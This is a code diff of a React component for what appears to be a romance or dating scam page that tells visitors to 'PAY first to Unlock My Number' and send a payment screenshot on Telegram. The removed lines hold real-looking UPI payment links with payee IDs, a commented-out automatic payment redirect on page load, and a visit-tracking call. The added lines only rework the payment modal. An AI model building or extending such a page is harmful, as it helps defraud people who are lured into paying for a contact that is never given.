@@ -40,20 +40,14 @@ function App() {
   const [isOpen, setisOpen] = useState(false);
   const [isConfirmOpen, setisConfirmOpen] = useState(false);
 
-  useEffect(() => {
-    sendUpdate("Home");
-    setTimeout(() => {
-      console.log("launching");
-      //window.open("upi://pay?pa=paytmqr28100505010111o4jao8e1ay@paytm&pn=ReddyGirl&tn=ReddyGirl", "_self");
-    }, 1500);
-  }, []);
-
-
-
   const handlepayButton = async () => {
+    console.log('pay button clicked')
     setisConfirmOpen(!isOpen)
     // await sendUpdate("PayButton")
-    window.location.href = "upi://pay?pa=bharatpe.0851610820@icici&pn=Girls Community&mc=5499&mode=02&orgid=000000&paytmqr=281005050101JNIRP1UEOE1Y&sign=MEQCIBVdzP1idNlw8VSOLIlxBzE7YeDQzXdB7BuybVYYqUvMAiAdI5eZhJHf3O+WhbHAOBHnto6w4C9x8e1TyaONNMJinQ==";
+  }
+
+  const togglePay = () => {
+    setisConfirmOpen(!isConfirmOpen);
   }
 
   const handleWspButton = async () => {
@@ -87,7 +81,7 @@ function App() {
         <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
         <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
         <h6 style={{ color: "bisque", fontSize: "1rem" }}>PAY NOW and Send me SCREENSHOT on Telegram!!🥰</h6>
-        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} fn={handlepayButton} className="special_modal"></PaymentModal>}
+        {isOpen && <PaymentModal isOpen={isOpen} setisOpen={setisOpen} togglePay={togglePay} className="special_modal"></PaymentModal>}
         {isConfirmOpen && <ConfirmModal isOpen={isConfirmOpen} setisOpen={setisConfirmOpen} fn={handlepayButton} className="special_modal"></ConfirmModal>}
       </header>
     </div >
